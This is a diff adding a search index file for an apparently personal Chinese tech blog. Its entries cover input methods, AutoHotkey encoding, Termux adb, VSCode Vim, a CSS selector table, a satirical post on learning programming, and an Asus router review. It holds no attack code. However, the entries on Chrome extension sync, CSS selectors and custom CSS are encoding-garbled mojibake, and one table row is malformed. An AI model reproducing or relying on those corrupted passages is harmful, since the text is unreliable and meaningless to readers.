@@ -1,0 +1,1586 @@
+<?xml version="1.0" encoding="utf-8"?>
+<search> 
+  
+  
+    
+    <entry>
+      <title>打印机共享</title>
+      <link href="/2024/02/20/%E6%89%93%E5%8D%B0%E6%9C%BA%E5%85%B1%E4%BA%AB/"/>
+      <url>/2024/02/20/%E6%89%93%E5%8D%B0%E6%9C%BA%E5%85%B1%E4%BA%AB/</url>
+      
+        <content type="html"><![CDATA[<h1 id="打印机共享"><a href="#打印机共享" class="headerlink" title="打印机共享"></a>打印机共享</h1>]]></content>
+      
+      
+      <categories>
+          
+          <category> 打印机 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 打印机 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>微信输入法</title>
+      <link href="/2024/02/17/%E5%BE%AE%E4%BF%A1%E8%BE%93%E5%85%A5%E6%B3%95/"/>
+      <url>/2024/02/17/%E5%BE%AE%E4%BF%A1%E8%BE%93%E5%85%A5%E6%B3%95/</url>
+      
+        <content type="html"><![CDATA[<h1 id="关于"><a href="#关于" class="headerlink" title="关于"></a>关于</h1><p>鉴于实在是不想使用搜狗了，所以暂时切换到了使用微信输入法<br>当然现在这个输入法还是一大堆的缺陷，这个帖子主要就是说明他的不足，后续如果更新了就删掉对应的不足</p><h1 id="不足"><a href="#不足" class="headerlink" title="不足"></a>不足</h1><ol><li>没有锁定默认英文</li><li>没有中文时候锁定英文标点符号</li><li>没有v模式，u模式，人名模式等</li><li>没有联网词库，无法自行导入词库</li></ol>]]></content>
+      
+      
+      <categories>
+          
+          <category> 输入法 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 输入法 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>学编程的笑话</title>
+      <link href="/2024/02/14/%E5%AD%A6%E7%BC%96%E7%A8%8B%E7%9A%84%E7%AC%91%E8%AF%9D/"/>
+      <url>/2024/02/14/%E5%AD%A6%E7%BC%96%E7%A8%8B%E7%9A%84%E7%AC%91%E8%AF%9D/</url>
+      
+        <content type="html"><![CDATA[<h1 id="摘抄的"><a href="#摘抄的" class="headerlink" title="摘抄的"></a>摘抄的</h1><ol><li>选择一个难学的语言<br>首先选择一个难学的开发语言，在这一点上不要投机。</li></ol><p>也许你听人们说过C++或Java对于初学者而言太难了，但是即使这些难学的语言也只需要 一点额外的耐心和坚持。</p><p>可能你会选择一个老式的开发语言，例如COBOL或PL&#x2F;I，或者相当底层的语言例如汇编甚至 机器码？那为什么不试一下像Malbolge或Befunge或INTERCAL这样深奥的语言呢？</p><p>无论怎样，不要选择一个现代的、到处在用的开发语言例如JavaScript、Python或Ruby。 虽然这些开发语言可能有巨大的需求，网上也有很多的学习资源，例如像汇智网 这样专门针对自学编程者提供的在线学习服务，有系统的教程，也有助教答疑。</p><ol start="2"><li>搭建一个糟糕的编程开发环境<br>你可能听说过众多的可以免费下载或试用的文本编辑器和集成开发环境，例如Sublime、Atom、 VSCode、IntelliJ…</li></ol><p>有些人声称这些工具可以更舒服和高效地写代码，请忽略他们。</p><p>确实…自动完成、语法高亮、代码检查、以及各种各样的扩展包，听起来可以让开发 变得简单。不过现实完全不同。真正知道如何开发软件的人不需要这些东西。</p><p>事实是这些被业界专业人士和熟练开发者使用的编辑器和IDE与开发是无关的，它只是一种 阴谋而已，毫无疑问。</p><p>基于终端的编辑器，例如Vim或Emacs，常被认为是难学的，不过即使这些也是可以在 实践中掌握的。</p><p>在一个更有挑战性的开发环境中，可以尝试windows写字板，反转你的键盘，拔掉你的显示器， 可能看起来是这样：</p><ol start="3"><li>早日开始大型项目<br>如果你是认真对待学习编程这件事，那么每个人都知道你应当帮助世界进步。</li></ol><p>毕竟，你应当能够在第一个星期就做出一个实时分布式视频流媒体平台，然后在第二个星期 添加基于人工智能的推荐系统，然后一个月左右差不多就可以搞出来一个百亿美元估值的高科技 企业了。</p><p>无论如何，不需要在意那些针对初学者的分步学习项目，也不需要为流行的开源项目做贡献。 绝对不要在这些事情上费神。</p><ol start="4"><li>永远不要寻求帮助<br>在软件开发领域，新手这个词实际上指的那些天生有很多年经验和编程知识的人。</li></ol><p>这就是为什么开发者从来不寻求帮助的原因。另外，对某些东西感到生疏是一种典型的示弱。</p><p>你不想表现的软弱，因此当你可能需要时不要寻求帮助。为什么你可以用本办法学习时还 寻求帮助？</p><p>问答网站例如stackoverflow看起来有各种经验层级的开发者回答彼此的问题。但是他们 真的了解什么？</p><p>需要承认，他们许多人都是专家级的软件专业人士，他们希望与所有阶段的开发者分享 他们的知识。但是他们绝对帮助不了我们…</p><ol start="5"><li>休息6个月再学<br>你知道什么是比学习编程更难的吗？</li></ol><p>花两个小时学习开发，然后休息六个月，接着回来学。</p><p>每个人都知道成功的关键是不坚持。有些人声称他们经常做小练习是学习新技能的最好办法。 他们也说一天20分钟就会有效果。不管从哪方面说，他们都是错的。</p><p>一个六个月长的休息可以完美地忘记之前学习的东西。如果你不能休息六个月，怎么也得 休息至少三、四个月才行。</p><p>只是不要把学习变成你的日常生活的一部分，就像刷牙和冲马桶一样的日常生活。没有人 可以通过天天做一件事达到擅长。</p><ol start="6"><li>不要围绕主题阅读<br>互联网时代的一大缺陷就是，网上你没有足够的东西去阅读、去听、去看。</li></ol><p>可能你听说过博客、在线出版物、播客、视频教程等等。坏消息是，我已经确认过了，这些 东西根本不存在。</p><p>除此之外，有人会真的相信主题阅读可以帮助你更广泛地理解吗？或者那些偶然看见 的文章可以激发你深入之前从未考虑过的方向？</p><p>即使这些神奇的资料真的存在，谁敢保证它们的高质量、或者是专家写的？</p><p>可能你应该试着去书店或图书馆看看？</p><p>不过还是坏消息，现在没人再出版纸质书了，因为没人看。互联网杀了它们。</p><ol start="7"><li>避免和更有经验的开发者打交道<br>学习任何东西的第一规则就是：远离专家。</li></ol><p>这是因为大多数专家只有短期记忆，记不起来他们开始学习时的情形。这不是他们的错， 他们的脑子里只是充满了太多你不懂的东西。</p><p>经验被高估了…对吗？对。</p><p>很多家伙说结对编程是向有经验开发者学习技巧的好办法。实际上，你更可能学习他们的 坏习惯或错误的世界观。</p><p>另外，回忆一下上次有人向你咨询他们关心事情的建议，想像你的感受有多糟糕？</p><p>因此，你真的认为有经验的开发者喜欢讨论他们做的事情吗？当然不。</p><ol start="8"><li>远离实习和工作申请<br>最后，避免寻找你学习领域内的实习机会和入门级开发工作。</li></ol><p>在你已经开发出可以登月着陆的代码之前，不要申请任何工作。在拿到比尔盖茨和蒂姆库克 的联名推荐信之前，不要申请任何工作。</p><p>是的，实习可以提供现实中在开发团队中的工作经验，可以让你的工作获得实时反馈，也可以 帮助你决定是否为一个特定的工作角色做好了准备。</p><p>但是！如果你认为这些实习和初级工作有助于你成为一名专业的开发人员，这种想法是错误的。</p><p>每个人都知道实习生是廉价劳动力。事实上，你的时间将被用来煮咖啡。记住，所有的关于 学习编程的成功故事都有意忽略了这一关键的细节。</p><p>类似的，申请工作也是一个糟糕的想法。</p><p>是的，查看工作申请可以让你知道下一步要学习什么技能。但是记住，企业总是希望你的技能 比简历里的多得多，这是一个没有尽头的过程。</p><p>即使你申请了一个工作，也接到了面试邀请，一定要拒绝。面试很可怕，而且永远与经验无关。 更好的做法是闭上眼，等着工作来找你。</p><p>补充说明<br>当然，如果你希望轻松学编程，请参考以下建议：</p><p>选择一个现代的、随处可用的开发语言，例如JavaScript、Python或Ruby<br>使用业界广泛使用的代码编辑器和集成开发环境<br>自动完成、语法高亮、代码审查以及各种扩展包可以让编程更轻松<br>有很多对初学者友好的、逐步深入的学习项目<br>向流行的开源项目贡献代码从未像今天这样简单<br>善用stackoverflow…那里有各种级别的开发者彼此回答问题<br>求助那些有经验的专家，他们通常乐于分享<br>经常做小练习是学习新技能的最好方法<br>每天即使只练习20分钟也会有巨大的收获<br>让编程称为你的生活一部分<br>围绕一个主题进行阅读可以拓宽你的视野<br>偶然碰到的文章可以激发你研究从未考虑过的方向<br>网上的教程也可以是高质量的、或者由专家撰写，比如汇智网的教程<br>去图书馆或书店看书<br>结对编程是向高手学习的好办法<br>有经验的开发者喜欢讨论他们在做的事情<br>向有经验的开发者咨询他们开始学习时是如何处理问题的<br>实习可以提供团队工作机会，获得真实反馈，也可以帮助你决定是否为某个工作做好了准备<br>查看工作要求可以让你评估下一阶段的学习方向<br>面试…经多了就简单了</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 随笔 </category>
+          
+      </categories>
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>tc升级的操作</title>
+      <link href="/2024/02/14/tc%E5%8D%87%E7%BA%A7%E7%9A%84%E6%93%8D%E4%BD%9C/"/>
+      <url>/2024/02/14/tc%E5%8D%87%E7%BA%A7%E7%9A%84%E6%93%8D%E4%BD%9C/</url>
+      
+        <content type="html"><![CDATA[<h1 id="简易流程"><a href="#简易流程" class="headerlink" title="简易流程"></a>简易流程</h1><p>官网下载对应32还是64位的tc<br>解压里面的cab,出来的文件,先复制自身tc除了user文件夹之外的文件文件名<br>在cab解压出来的目录导入剪切板的选择<br>替换<br>最后语言文件替换一下就完事了</p>]]></content>
+      
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>ahk文件编码</title>
+      <link href="/2024/02/12/ahk%E6%96%87%E4%BB%B6%E7%BC%96%E7%A0%81/"/>
+      <url>/2024/02/12/ahk%E6%96%87%E4%BB%B6%E7%BC%96%E7%A0%81/</url>
+      
+        <content type="html"><![CDATA[<h1 id="缘起"><a href="#缘起" class="headerlink" title="缘起"></a>缘起</h1><p>经常出现跑起来代码乱码之类的问题,还有推荐都是u8bom不用u8</p><h1 id="帮助中的表述"><a href="#帮助中的表述" class="headerlink" title="帮助中的表述"></a>帮助中的表述</h1><p>虽然 AutoHotkey 支持 Unicode 文本, 但它是为了向后兼容而优化的, 这意味着默认为 ANSI 编码, 而不是国际上推荐的 UTF-8. 除非以字节顺序标记(BOM) 开始, 否则 AutoHotkey 不会自动识别 UTF-8 文件.</p><h1 id="解释"><a href="#解释" class="headerlink" title="解释"></a>解释</h1><p>就是如果不是u8bom,就按a解读,所以u8是绝对会对中文出现错误的<br>所以首选u8bom,其次cp936</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> ahk </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> ahk </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>termux使用adb</title>
+      <link href="/2024/02/11/termux%E4%BD%BF%E7%94%A8adb/"/>
+      <url>/2024/02/11/termux%E4%BD%BF%E7%94%A8adb/</url>
+      
+        <content type="html"><![CDATA[<h1 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h1><p>有时候没有win设备的时候想要adb调试一下电视之类的安卓设备,这时候手机也能凑合使用</p><h1 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h1><p><a href="https://github.com/MasterDevX/Termux-ADB">https://github.com/MasterDevX/Termux-ADB</a><br>可以参照这个<br>考虑到可能的兼容性问题<br>直接 pkg install android-tools</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 安卓 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> termux </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>vscode vim插件</title>
+      <link href="/2024/02/05/vscode%20vim%E6%8F%92%E4%BB%B6/"/>
+      <url>/2024/02/05/vscode%20vim%E6%8F%92%E4%BB%B6/</url>
+      
+        <content type="html"><![CDATA[<h1 id="不要有太高的期待和要求"><a href="#不要有太高的期待和要求" class="headerlink" title="不要有太高的期待和要求"></a>不要有太高的期待和要求</h1><p>仅仅是模拟一些基础的按键等于</p><h1 id="neovim插件"><a href="#neovim插件" class="headerlink" title="neovim插件"></a>neovim插件</h1><p>这个插件是基本完美支持vimrc配置,用nvim作为后端,vscode作为前端使用的,不过bug更多,放弃</p><h1 id="vscodevim"><a href="#vscodevim" class="headerlink" title="vscodevim"></a>vscodevim</h1><p>remap正经是要在json中写的,但是嫌麻烦,支持.vimrc但是只能简单映射一点快捷键,没啥意思,凑合用,命令之类的也是支持的不全</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> vscode </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> vscode </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>微信输入法同步服务</title>
+      <link href="/2024/02/05/%E5%BE%AE%E4%BF%A1%E8%BE%93%E5%85%A5%E6%B3%95%E5%90%8C%E6%AD%A5%E6%9C%8D%E5%8A%A1/"/>
+      <url>/2024/02/05/%E5%BE%AE%E4%BF%A1%E8%BE%93%E5%85%A5%E6%B3%95%E5%90%8C%E6%AD%A5%E6%9C%8D%E5%8A%A1/</url>
+      
+        <content type="html"><![CDATA[<h1 id="微信输入法功能"><a href="#微信输入法功能" class="headerlink" title="微信输入法功能"></a>微信输入法功能</h1><p>pc端的基本输入功能完全不过关,不过这个多设备同步剪切板的功能相当好用</p><h1 id="不使用wetype输入-但是使用同步"><a href="#不使用wetype输入-但是使用同步" class="headerlink" title="不使用wetype输入,但是使用同步"></a>不使用wetype输入,但是使用同步</h1><p>安装输入法后<strong>首先完成设备的绑定</strong>然后可以从输入法界面上删掉这个输入法,开机自启这个服务即可,这个服务包含了同步的功能</p><p><img src="https://raw.githubusercontent.com/hzncpa/pichost/main/img/20240205094505.png"></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 输入法 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 软件 </tag>
+            
+            <tag> 输入法 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>����chrome�������չ������ͬ��</title>
+      <link href="/2024/02/04/%E5%85%B3%E4%BA%8Echrome%E6%B5%8F%E8%A7%88%E5%99%A8%E6%89%A9%E5%B1%95%E7%9A%84%E9%85%8D%E7%BD%AE%E5%90%8C%E6%AD%A5/"/>
+      <url>/2024/02/04/%E5%85%B3%E4%BA%8Echrome%E6%B5%8F%E8%A7%88%E5%99%A8%E6%89%A9%E5%B1%95%E7%9A%84%E9%85%8D%E7%BD%AE%E5%90%8C%E6%AD%A5/</url>
+      
+        <content type="html"><![CDATA[<h1 id="����-��Lj�Ӵ���-����������"><a href="#����-��Lj�Ӵ���-����������" class="headerlink" title="����(��Ŀǰ�Ӵ���,����������)"></a>����(��Ŀǰ�Ӵ���,����������)</h1><ol><li>�ȶ���webdev</li><li>��chrome�Ľӿ�ͬ��</li><li>�ֶ���github֮���url</li><li>���������ϵ��ֶ���������</li></ol>]]></content>
+      
+      
+      <categories>
+          
+          <category> ����� </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> ����� </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>cssѡ�����ٲ�</title>
+      <link href="/2024/02/04/css%E9%80%89%E6%8B%A9%E5%99%A8%E9%80%9F%E6%9F%A5/"/>
+      <url>/2024/02/04/css%E9%80%89%E6%8B%A9%E5%99%A8%E9%80%9F%E6%9F%A5/</url>
+      
+        <content type="html"><![CDATA[<table><thead><tr><th>ѡ����</th><th>ʾ��</th><th>ʾ��˵��</th><th>CSS</th></tr></thead><tbody><tr><td>.class</td><td>.intro</td><td>ѡ������class&#x3D;”intro”��Ԫ��</td><td>1</td></tr><tr><td>#id</td><td>#firstname</td><td>ѡ������id&#x3D;”firstname”��Ԫ��</td><td>1</td></tr><tr><td>*</td><td>*</td><td>ѡ������Ԫ��</td><td>2</td></tr><tr><td>element</td><td>p</td><td>ѡ������<p>Ԫ��</td><td>1</td></tr><tr><td>element,element</td><td>div,p</td><td>ѡ������<div>Ԫ�غ�<p>Ԫ��</td><td>1</td></tr><tr><td>element element</td><td>div p</td><td>ѡ��<div>Ԫ���ڵ�����<p>Ԫ��</td><td>1</td></tr><tr><td>element&gt;element</td><td>div&gt;p</td><td>ѡ�����и����� <div> Ԫ�ص� <p> Ԫ��</td><td>2</td></tr><tr><td>element+element</td><td>div+p</td><td>ѡ�����н�����<div>Ԫ��֮���<p>Ԫ��</td><td>2</td></tr><tr><td>[attribute]</td><td>[target]</td><td>ѡ�����д���target����Ԫ��</td><td>2</td></tr><tr><td>[attribute&#x3D;value]</td><td>[target&#x3D;-blank]</td><td>ѡ������ʹ��target&#x3D;”-blank”��Ԫ��</td><td>2</td></tr><tr><td>[attribute~&#x3D;value]</td><td>[title~&#x3D;flower]</td><td>ѡ��������԰�������”flower”������Ԫ��</td><td>2</td></tr><tr><td>[attribute</td><td>&#x3D;language]</td><td>[lang</td><td>&#x3D;en]</td></tr><tr><td>:link</td><td>a:link</td><td>ѡ������δ��������</td><td>1</td></tr><tr><td>:visited</td><td>a:visited</td><td>ѡ�����з��ʹ�������</td><td>1</td></tr><tr><td>:active</td><td>a:active</td><td>ѡ������</td><td>1</td></tr><tr><td>:hover</td><td>a:hover</td><td>ѡ���������������ʱ</td><td>1</td></tr><tr><td>:focus</td><td>input:focus</td><td>ѡ����н��������Ԫ��</td><td>2</td></tr><tr><td>:first-letter</td><td>p:first-letter</td><td>ѡ��ÿһ��<P>Ԫ�صĵ�һ����ĸ</td><td>1</td></tr><tr><td>:first-line</td><td>p:first-line</td><td>ѡ��ÿһ��<P>Ԫ�صĵ�һ��</td><td>1</td></tr><tr><td>:first-child</td><td>p:first-child</td><td>ָ��ֻ�е�<p>Ԫ�����丸���ĵ�һ���Ӽ�����ʽ��</td><td>2</td></tr><tr><td>:before</td><td>p:before</td><td>��ÿ��<p>Ԫ��֮ǰ��������</td><td>2</td></tr><tr><td>:after</td><td>p:after</td><td>��ÿ��<p>Ԫ��֮���������</td><td>2</td></tr><tr><td>:lang(language)</td><td>p:lang(it)</td><td>ѡ��һ��lang���Ե���ʼֵ&#x3D;”it”������<p>Ԫ��</td><td>2</td></tr><tr><td>element1~element2</td><td>p~ul</td><td>ѡ��pԪ��֮���ÿһ��ulԪ��</td><td>3</td></tr><tr><td>[attribute^&#x3D;value]</td><td>a[src^&#x3D;”https”]</td><td>ѡ��ÿһ��src���Ե�ֵ��”https”��ͷ��Ԫ��</td><td>3</td></tr><tr><td>[attribute$&#x3D;value]</td><td>a[src$&#x3D;”.pdf”]</td><td>ѡ��ÿһ��src���Ե�ֵ��”.pdf”��β��Ԫ��</td><td>3</td></tr><tr><td>[attribute*&#x3D;value]</td><td>a[src*&#x3D;”44lan”]</td><td>ѡ��ÿһ��src���Ե�ֵ�������ַ���”44lan”��Ԫ��</td><td>3</td></tr><tr><td>:first-of-type</td><td>p:first-of-type</td><td>ѡ��ÿ��pԪ�����丸���ĵ�һ��pԪ��</td><td>3</td></tr><tr><td>:last-of-type</td><td>p:last-of-type</td><td>ѡ��ÿ��pԪ�����丸�������һ��pԪ��</td><td>3</td></tr><tr><td>:only-of-type</td><td>p:only-of-type</td><td>ѡ��ÿ��pԪ�����丸����ΨһpԪ��</td><td>3</td></tr><tr><td>:only-child</td><td>p:only-child</td><td>ѡ��ÿ��pԪ�����丸����Ψһ��Ԫ��</td><td>3</td></tr><tr><td>:nth-child(n)</td><td>p:nth-child(2)</td><td>ѡ��ÿ��pԪ�����丸���ĵڶ�����Ԫ��</td><td>3</td></tr><tr><td>:nth-last-child(n)</td><td>p:nth-last-child(2)</td><td>ѡ��ÿ��pԪ�ص����丸���ĵڶ�����Ԫ�أ������һ���������</td><td>3</td></tr><tr><td>:nth-of-type(n)</td><td>p:nth-of-type(2)</td><td>ѡ��ÿ��pԪ�����丸���ĵڶ���pԪ��</td><td>3</td></tr><tr><td>:nth-last-of-type(n)</td><td>p:nth-last-of-type(2)</td><td>ѡ��ÿ��pԪ�ص����丸���ĵڶ���pԪ�أ������һ���������</td><td>3</td></tr><tr><td>:last-child</td><td>p:last-child</td><td>ѡ��ÿ��pԪ�����丸�������һ���Ӽ���</td><td>3</td></tr><tr><td>:root</td><td>:root</td><td>ѡ���ĵ��ĸ�Ԫ��</td><td>3</td></tr><tr><td>:empty</td><td>p:empty</td><td>ѡ��ÿ��û���κ��Ӽ���pԪ�أ������ı��ڵ㣩</td><td>3</td></tr><tr><td>:target</td><td>#news:target</td><td>ѡ��ǰ���#newsԪ�أ�������ê���Ƶĵ����URL��</td><td>3</td></tr><tr><td>:enabled</td><td>input:enabled</td><td>ѡ��ÿһ�������õ�����Ԫ��</td><td>3</td></tr><tr><td>:disabled</td><td>input:disabled</td><td>ѡ��ÿһ�����õ�����Ԫ��</td><td>3</td></tr><tr><td>:checked</td><td>input:checked</td><td>ѡ��ÿ��ѡ�е�����Ԫ��</td><td>3</td></tr><tr><td>:not(selector)</td><td>:not(p)</td><td>ѡ��ÿ������pԪ�ص�Ԫ��</td><td>3</td></tr><tr><td>::selection</td><td>::selection</td><td>ƥ��Ԫ���б��û�ѡ�л��ڸ���״̬�Ĳ���</td><td>3</td></tr><tr><td>:out-of-range</td><td>:out-of-range</td><td>ƥ��ֵ��ָ������֮���inputԪ��</td><td>3</td></tr><tr><td>:in-range</td><td>:in-range</td><td>ƥ��ֵ��ָ������֮�ڵ�inputԪ��</td><td>3</td></tr><tr><td>:read-write</td><td>:read-write</td><td>����ƥ��ɶ�����д��Ԫ��</td><td>3</td></tr><tr><td>:read-only</td><td>:read-only</td><td>����ƥ������ “readonly”��ֻ���� ���Ե�Ԫ��</td><td>3</td></tr><tr><td>:optional</td><td>:optional</td><td>����ƥ���ѡ������Ԫ��</td><td>3</td></tr><tr><td>:required</td><td>:required</td><td>����ƥ�������� “required” ���Ե�Ԫ��</td><td>3</td></tr><tr><td>:valid</td><td>:valid</td><td>����ƥ������ֵΪ�Ϸ���Ԫ��</td><td>3</td></tr><tr><td>:invalid</td><td>:invalid</td><td>����ƥ������ֵΪ�Ƿ���Ԫ��</td><td>3</td></tr></tbody></table>]]></content>
+      
+      
+      <categories>
+          
+          <category> �ٲ� </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> �ٲ� </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>�Զ���css��Ԫ������</title>
+      <link href="/2024/02/04/%E8%87%AA%E5%AE%9A%E4%B9%89css%E5%92%8C%E5%85%83%E7%B4%A0%E5%B1%8F%E8%94%BD/"/>
+      <url>/2024/02/04/%E8%87%AA%E5%AE%9A%E4%B9%89css%E5%92%8C%E5%85%83%E7%B4%A0%E5%B1%8F%E8%94%BD/</url>
+      
+        <content type="html"><![CDATA[<h1 id="Ϊɶ"><a href="#Ϊɶ" class="headerlink" title="Ϊɶ"></a>Ϊɶ</h1><p>ҳ���Ϻܶ಻�뿴����Ԫ�ز������ǹ��<br>�Զ���css��Ȼ����,�����ֶ�д��ʵ���������<br>����ʹ��ublock���ȥ�������usercss�����</p><h1 id="�ֹ�"><a href="#�ֹ�" class="headerlink" title="�ֹ�"></a>�ֹ�</h1><p>ublockֻ��������Ԫ��,������ѡ�������μ��ֶ��޸�,��ͬ��<br>usercssֻ�Բ�����Ҫ�޸�һ����ʾЧ����ҳ��ʹ��,ʡ�ĸ�����ѡ����Ȼ��д���������</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> ����� </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> ����� </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>华硕路由器官方rom评测</title>
+      <link href="/2024/02/03/%E5%8D%8E%E7%A1%95%E8%B7%AF%E7%94%B1%E5%99%A8%E5%AE%98%E6%96%B9rom%E8%AF%84%E6%B5%8B/"/>
+      <url>/2024/02/03/%E5%8D%8E%E7%A1%95%E8%B7%AF%E7%94%B1%E5%99%A8%E5%AE%98%E6%96%B9rom%E8%AF%84%E6%B5%8B/</url>
+      
+        <content type="html"><![CDATA[<h1 id="关于本文"><a href="#关于本文" class="headerlink" title="关于本文"></a>关于本文</h1><p>笔者也算是多年的阉割版红米路由器用户了,第一次使用华硕路由器,新入了一款华硕天选ax6000,对照手上的阉割红米进行一波简单的功能评测</p><h1 id="吐槽"><a href="#吐槽" class="headerlink" title="吐槽"></a>吐槽</h1><p>路由器确实是家庭网络中比较重要的环节,更换路由器要下好一番功夫来调试配置,属实难顶</p><p>以下正文</p><h1 id="主页"><a href="#主页" class="headerlink" title="主页"></a>主页</h1><p>看到这个定制主页的刹那,我知道我把装宽带送的红米放在了他不该在的位置,何德何能和700档位的路由器做比较..</p><p>红米的不截图了,降维打击</p><p><img src="https://raw.githubusercontent.com/hzncpa/pichost/main/img/%E4%B8%BB%E9%A1%B5.png"></p><h1 id="一些该有-但我用的少的功能"><a href="#一些该有-但我用的少的功能" class="headerlink" title="一些该有,但我用的少的功能"></a>一些该有,但我用的少的功能</h1><p>比如访客网络,mesh,安全,家长控制,加速器.qos等</p><p>走马观花,红米也有,只是视觉效果比不上罢了,不稀奇</p><p><img src="https://raw.githubusercontent.com/hzncpa/pichost/main/img/mesh.png"></p><p><img src="https://raw.githubusercontent.com/hzncpa/pichost/main/img/%E5%AE%89%E5%85%A8.png"></p><p><img src="https://raw.githubusercontent.com/hzncpa/pichost/main/img/%E5%8A%A0%E9%80%9F%E5%99%A8.png"></p><p><img src="https://raw.githubusercontent.com/hzncpa/pichost/main/img/qos.png"></p><p>安全功能看起来挺有意思,不过只能拦截他自己提供的列表的内容</p><p>家长控制的设置项看起来比红米稍微多一些</p><h1 id="游戏加速"><a href="#游戏加速" class="headerlink" title="游戏加速"></a>游戏加速</h1><p>买的这个路由器顶着游戏加速的名头,确实有一个游戏模式一样的配置页面,不过我也不玩游戏,这个就不多说了包括opennat都是为了游戏用户准备的</p><p><img src="https://raw.githubusercontent.com/hzncpa/pichost/main/img/opennat.png"></p><h1 id="qos"><a href="#qos" class="headerlink" title="qos"></a>qos</h1><p>设置项看起来可比红米的多很多,不过我就一个人用网,手动对下载任务进行速度管理差不多就可以了,家里多个用户的话确实也是个重要的项目</p><h1 id="流量监控"><a href="#流量监控" class="headerlink" title="流量监控"></a>流量监控</h1><p>这个图表很有高级感</p><p><img src="https://raw.githubusercontent.com/hzncpa/pichost/main/img/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90.png"></p><h1 id="usb"><a href="#usb" class="headerlink" title="usb"></a>usb</h1><p>我的红米没有usb功能</p><p><img src="https://raw.githubusercontent.com/hzncpa/pichost/main/img/20240203212552.png"></p><h1 id="ddns"><a href="#ddns" class="headerlink" title="ddns"></a>ddns</h1><p>华硕自己提供了ddns服务的,完爆</p><p><img src="https://raw.githubusercontent.com/hzncpa/pichost/main/img/20240203212815.png"></p><h1 id="aicloud"><a href="#aicloud" class="headerlink" title="aicloud"></a>aicloud</h1><p>围绕usb和公网访问的功能</p><p><img src="https://raw.githubusercontent.com/hzncpa/pichost/main/img/20240203212846.png"></p><h1 id="网线网的专业设置"><a href="#网线网的专业设置" class="headerlink" title="网线网的专业设置"></a>网线网的专业设置</h1><p><img src="https://raw.githubusercontent.com/hzncpa/pichost/main/img/image-20240203213048101.png"></p><h1 id="双线路"><a href="#双线路" class="headerlink" title="双线路"></a>双线路</h1><p><img src="https://raw.githubusercontent.com/hzncpa/pichost/main/img/image-20240203213223920.png"></p><h1 id="穿透相关"><a href="#穿透相关" class="headerlink" title="穿透相关"></a>穿透相关</h1><p><img src="https://raw.githubusercontent.com/hzncpa/pichost/main/img/image-20240203213252010.png"></p><p>都有的功能,设置项更多吧</p><h1 id="类似语音助手"><a href="#类似语音助手" class="headerlink" title="类似语音助手"></a>类似语音助手</h1><p>这就花里胡哨了</p><p><img src="https://raw.githubusercontent.com/hzncpa/pichost/main/img/image-20240203213334935.png"></p><h1 id="vpn"><a href="#vpn" class="headerlink" title="vpn"></a>vpn</h1><p>用不到</p><p><img src="https://raw.githubusercontent.com/hzncpa/pichost/main/img/image-20240203213400186.png"></p><h1 id="防火墙"><a href="#防火墙" class="headerlink" title="防火墙"></a>防火墙</h1><p>红米的防火墙没细致的设置界面</p><p><img src="https://raw.githubusercontent.com/hzncpa/pichost/main/img/image-20240203213434228.png"></p><h1 id="系统设置"><a href="#系统设置" class="headerlink" title="系统设置"></a>系统设置</h1><p>更多的设置和支持自己刷机</p><p><img src="https://raw.githubusercontent.com/hzncpa/pichost/main/img/image-20240203213454595.png"></p><h1 id="系统日志"><a href="#系统日志" class="headerlink" title="系统日志"></a>系统日志</h1><p>红米是直接没有的,这个给华硕打满分,多种日志齐全</p><p><img src="https://raw.githubusercontent.com/hzncpa/pichost/main/img/20240203213802.png"></p><h1 id="网络工具"><a href="#网络工具" class="headerlink" title="网络工具"></a>网络工具</h1><p>可视化的网络工具,可有可无吧,都是些基础的网络命令</p><p><img src="C:\Users\cpazh\AppData\Roaming\Typora\typora-user-images\image-20240203213843189.png" alt="image-20240203213843189"></p><h1 id="灯和性能监视"><a href="#灯和性能监视" class="headerlink" title="灯和性能监视"></a>灯和性能监视</h1><p><img src="https://raw.githubusercontent.com/hzncpa/pichost/main/img/%E8%BF%99%E4%B9%9F%E6%9C%89%E7%81%AF.png"></p><p><img src="https://raw.githubusercontent.com/hzncpa/pichost/main/img/%E8%B7%AF%E7%94%B1%E5%99%A8%E6%80%A7%E8%83%BD%E7%9B%91%E8%A7%86%E5%99%A8.png"></p><h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>功能确实吊打红米,不过价格差距也是悬殊,设置项过多,对基础用户来说可能大多用不到,高级用户也不会太依赖可视化的配置界面,总的来说我觉得小缺点就是配置太多,可能要花一段时间熟悉一下位置,整体来说,把我这个红米运营商定制,吊着打</p><p>不过想要玩一些高级功能的话,还是弄个软路由做旁路由比较方便</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 网络 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
